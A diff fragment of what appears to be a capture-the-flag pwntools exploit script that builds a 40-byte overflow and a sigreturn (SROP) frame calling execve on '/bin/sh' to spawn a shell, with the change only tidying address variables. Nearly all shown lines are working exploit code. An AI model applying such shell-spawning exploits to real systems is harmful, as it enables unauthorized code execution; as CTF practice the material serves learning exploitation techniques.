@@ -30,8 +30,8 @@ context.arch="amd64"
 
 # Variables
 padding=b'a'*40     # Buffer is 32 in size + 8 for ebp
-systemCall = p64(0x00185)
-shell = p64(0x004001ca) # address of bin/sh
+systemCall = 0x400185
+shell = 0x4001ca # address of bin/sh
 sigRet = p64(0x400180)  # call sigret manually via call
 raxReg = 59 # Call execve
 
@@ -45,10 +45,10 @@ payload += sigRet #sgadget pulled showing that can call sigret without needing t
 # Stack generation
 frame = SigreturnFrame(kernel='amd64')
 frame.rax = raxReg    # execve call
-frame.rdi = 0x4001ca  # Call shell, var has p64 which is messing up
+frame.rdi = shell  # Call shell, var has p64 which is messing up
 frame.rsi = 0
 frame.rdx = 0
-frame.rip = 0x400185  # Call system, var has p64
+frame.rip = systemCall  # Call system, var has p64
 
 payload += bytes(frame) # Don't need stack anywhere so can just pass to call later
 
